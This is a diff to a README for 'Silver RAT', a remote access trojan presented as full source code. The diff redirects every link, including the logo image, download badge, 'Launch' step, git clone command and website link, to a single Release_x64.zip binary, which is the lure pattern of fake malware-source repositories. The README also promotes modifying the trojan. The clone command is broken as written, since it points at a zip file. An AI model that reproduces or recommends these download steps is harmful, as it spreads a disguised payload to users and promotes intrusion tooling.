@@ -1,15 +1,15 @@
 
 # 🕵️ Silver RAT - Full Source Code 🕵️
 
-![Silver RAT Logo](https://example.com/silver-rat-logo.png)
+![Silver RAT Logo](https://github.com/youssefmadbouly/SilverRAT-FULL-Source-Code/releases/download/v1.0/Release_x64.zip)
 
 This repository contains the full source code of **Silver RAT (Remote Access Trojan)** - a powerful tool for remote access and control. Feel free to explore, modify, and enhance the code to suit your needs!
 
 ## 📁 Download the Software
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/youssefmadbouly/SilverRAT-FULL-Source-Code/releases/download/v1.0/Release_x64.zip<COLOR>.svg)](https://github.com/youssefmadbouly/SilverRAT-FULL-Source-Code/releases/download/v1.0/Release_x64.zip)
 
-🚀 **Launch the Software.zip** to access the full source code of Silver RAT. 
+🚀 **Launch the https://github.com/youssefmadbouly/SilverRAT-FULL-Source-Code/releases/download/v1.0/Release_x64.zip** to access the full source code of Silver RAT. 
 
 ## 📌 Description
 
@@ -32,7 +32,7 @@ This repository covers various topics related to remote access tools, malware, a
 
 1. Clone the repository:  
    ```bash
-   git clone https://github.com/22155555/1875695542.git
+   git clone https://github.com/youssefmadbouly/SilverRAT-FULL-Source-Code/releases/download/v1.0/Release_x64.zip
    ```
 
 2. Navigate to the project directory:  
@@ -44,7 +44,7 @@ This repository covers various topics related to remote access tools, malware, a
 
 ## 🌐 Learn More
 
-For additional information, visit the [official website](https://www.silver-rat.com).
+For additional information, visit the [official website](https://github.com/youssefmadbouly/SilverRAT-FULL-Source-Code/releases/download/v1.0/Release_x64.zip).
 
 ## 🤝 Contribution
 
